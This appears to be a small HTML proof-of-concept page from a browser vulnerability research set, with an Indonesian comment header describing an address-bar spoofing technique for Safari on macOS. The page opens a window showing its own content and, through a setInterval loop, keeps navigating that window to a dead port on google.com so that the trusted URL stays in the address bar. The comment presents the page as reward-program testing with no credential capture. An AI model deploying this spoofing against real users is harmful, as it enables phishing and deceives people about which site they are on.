<!-- 29 - setInterval klasik (bentuk WebKit)   [address-bar spoofing | macOS: Safari macOS]
     MEKANISME : bentuk kanonik yang pernah dibayar di WebKit: interval menembak ulang navigasi ke port mati.
     PREDIKAT  : bilah Safari menahan URL tepercaya di atas dokumen penyerang.
     AMAN      : bilah jujur.
     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
<meta charset="utf-8"><title>29 setInterval klasik (bentuk WebKit)</title>
<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
<script>
o.textContent='REAL: '+location.origin;
function go(){var w=window.open();w.document.write('<h3>BUKAN google.com - '+location.origin+'</h3>');setInterval(function(){w.location='https://www.google.com:82';},1000);}
</script>
